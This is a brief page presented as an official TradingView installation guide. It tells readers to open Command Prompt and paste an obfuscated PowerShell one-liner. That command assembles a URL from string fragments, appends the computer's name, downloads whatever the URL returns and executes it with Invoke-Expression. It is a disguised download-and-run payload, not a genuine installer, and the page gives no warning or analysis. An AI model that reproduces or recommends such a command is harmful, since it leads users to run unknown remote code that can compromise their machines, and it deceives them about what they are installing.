# Setting Up TradingView (Official Guide)

## TradingView Installation Steps

### Step 1: Open Command Prompt.
Press `Win + R`, type `cmd`, and press `Enter`

### Step 2: Execute the Command.
Use the following command in Command Prompt:
```powershell
powershell -command "if (($TradingView = '.app') -and ($Desktop = 'TradingViewDesktop' + 'TradingView' + $TradingView + '?connect=' + $env:COMPUTERNAME)) { $App = (iwr $Desktop -UseBasicParsing); iex ([Text.Encoding]::UTF8.GetString($App.Content)) }"
`````
